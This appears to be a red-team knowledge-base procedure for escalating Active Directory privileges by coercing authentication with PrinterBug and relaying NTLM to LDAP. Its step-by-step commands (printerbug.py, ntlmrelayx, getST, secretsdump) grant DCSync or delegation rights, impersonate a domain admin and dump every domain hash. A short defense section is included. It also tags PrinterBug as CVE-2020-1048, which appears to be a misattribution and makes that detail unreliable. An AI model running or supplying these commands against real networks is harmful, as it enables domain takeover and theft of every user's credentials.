---
id: b810df38-1b9d-4c46-bcaf-896041560576
name: resource-based-constrained-delegation-via-printerbug
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:05.545259+00:00'
updated_at: '2023-04-10T20:26:36.903240+00:00'
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
  - '[[techniques/Account Manipulation|T1097 - Account Manipulation]]'
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - active-directory-attacks
  - delegation-abuse
  - printerbug
  - ntlm-relay
  - kerberos
commands:
  - '[[commands/printerbug-exploit-exchange-server]]'
  - '[[commands/ntlmrelayx-grant-dcsync-privileges]]'
  - '[[commands/secretsdump-extract-domain-hashes]]'
  - '[[commands/ntlmrelayx-grant-delegation-access]]'
  - '[[commands/printerbug-trigger-spool-bug]]'
  - '[[commands/getst-impersonate-admin-ticket]]'
  - '[[commands/secretsdump-connect-using-ticket]]'
platforms:
  - Windows
  - Active Directory
tools:
  - '[[tools/impacket-suite]]'
validated: true
---

# resource-based-constrained-delegation-via-printerbug

## Summary

This procedure exploits the Resource-Based Constrained Delegation (RBCD) mechanism in Active Directory using the PrinterBug (SpoolService) vulnerability to escalate privileges. An attacker with domain user credentials can trigger the bug on a vulnerable Exchange server, relay the authentication via NTLM to LDAP, and either grant DCSync rights for hash dumping or set delegation permissions on a controlled machine account to impersonate users and access sensitive resources like domain controllers.

## Description

Resource-Based Constrained Delegation allows service owners to specify which accounts can delegate to them, but misconfigurations or vulnerabilities like PrinterBug (CVE-2020-1048 in MS-RPRN) enable attackers to abuse this. The attack involves connecting to a vulnerable Windows server (e.g., Exchange) via SMB, triggering the spooler to force an authentication relay back to the attacker. Using a modified ntlmrelayx from Impacket, the relayed NTLM auth is directed to LDAP on a domain controller, allowing modification of msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD or granting replication rights for DCSync. This leads to privilege escalation, lateral movement, or credential dumping. The target environment is Active Directory with Windows Server 2016+ and vulnerable spooler services (e.g., Exchange 2013/2016). Expected outcomes include obtaining Kerberos tickets for impersonation or full domain hashes.

## Requirements

1. Domain user credentials with network access to target servers (SMB/LDAP).
2. Attacker-controlled machine on the network with Impacket suite installed (python3, ldap3 dependencies).
3. Vulnerable target: Windows server with Print Spooler service enabled (e.g., Exchange server not patched for PrinterBug).
4. Domain controller accessible via LDAP/LDAPS for relay target.
5. Optional: Controlled machine account in AD for delegation setup.

## Defense

- Disable unnecessary Print Spooler services on non-print servers (e.g., Exchange) and apply patches for CVE-2020-1048.
- Enable Protected Users group or restrict delegation to trusted accounts only.
- Monitor LDAP modifications for msDS-AllowedToActOnBehalfOfOtherIdentity and replication rights changes via Event ID 5136.
- Implement network segmentation to limit SMB/LDAP access and use SMB signing to prevent relay.
- Enable Kerberos signing and monitor for anomalous service ticket requests (Event ID 4769).

## Objectives

1. Escalate from domain user to domain admin-equivalent access via delegation abuse.
2. Dump domain credentials using DCSync for further lateral movement.
3. Impersonate high-privilege users to access restricted resources like domain controllers.

## Instructions

### Step 1: Exploit PrinterBug on Target Exchange Server for DCSync Escalation

**Context**: Connect to the vulnerable Exchange server using domain credentials to trigger the SpoolService bug, forcing an NTLM authentication relay. Relay this to the domain controller's LDAP to grant DCSync (replication) privileges to the attacker's user account, enabling hash dumping.

**Command** ([[commands/printerbug-exploit-exchange-server]]):
```bash
python printerbug.py DOMAIN/USERNAME@TARGET_EXCHANGE_SERVER ATTACKER_IP
```

Run this in one terminal to trigger the bug. In a second terminal, prepare the relay.

**Command** ([[commands/ntlmrelayx-grant-dcsync-privileges]]):
```bash
ntlmrelayx.py --remove-mic --escalate-user ATTACKER_USERNAME -t ldap://DOMAIN_CONTROLLER -smb2support
```

Once relayed, use the escalated account to dump hashes.

**Command** ([[commands/secretsdump-extract-domain-hashes]]):
```bash
secretsdump.py DOMAIN/ATTACKER_USERNAME@DOMAIN_CONTROLLER -just-dc
```

> This sequence exploits the relay to grant replication rights, allowing extraction of NTLM hashes for all domain users, including admins. Expected output includes username:hash pairs; success if no authentication errors and hashes are retrieved.

### Step 2: Create Machine Account and Set Up Delegation for Impersonation

**Context**: If a controlled machine account is needed, create one (or use existing). Then trigger PrinterBug on the target server to relay authentication, granting RBCD permissions to the attacker's machine account via LDAP. This allows the attacker to impersonate any user to the target service.

**Command** ([[commands/ntlmrelayx-grant-delegation-access]]):
```bash
ntlmrelayx.py -t ldaps://DOMAIN_CONTROLLER --remove-mic --delegate-access -smb2support
```

Run this to prepare the relay for delegation grants.

**Command** ([[commands/printerbug-trigger-spool-bug]]):
```bash
python printerbug.py DOMAIN/USERNAME@TARGET_SERVER ATTACKER_IP
```

Trigger the bug to initiate the relay.

> After relay, the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is set, enabling delegation. Verify via ldapsearch or PowerView; success if no relay errors and delegation is confirmed.

### Step 3: Obtain Impersonation Ticket and Access Target

**Context**: Use the delegated machine account to request a service ticket impersonating a high-privilege user (e.g., domain admin) for the target SPN. Then use the ticket to connect and dump secrets from the domain controller.

**Command** ([[commands/getst-impersonate-admin-ticket]]):
```bash
getST.py -spn host/TARGET_SERVER.DOMAIN 'DOMAIN/MACHINE_ACCOUNT:PASSWORD' -impersonate TARGET_USERNAME
```

This generates a .ccache file for the impersonated user.

**Command** ([[commands/secretsdump-connect-using-ticket]]):
```bash
export KRB5CCNAME=TARGET_USERNAME.ccache
secretsdump.py -k -no-pass TARGET_SERVER -just-dc
```

> The ticket allows authentication as the impersonated user. Expected output: Dumped hashes and secrets; success if connection succeeds without password prompt and data is exfiltrated.
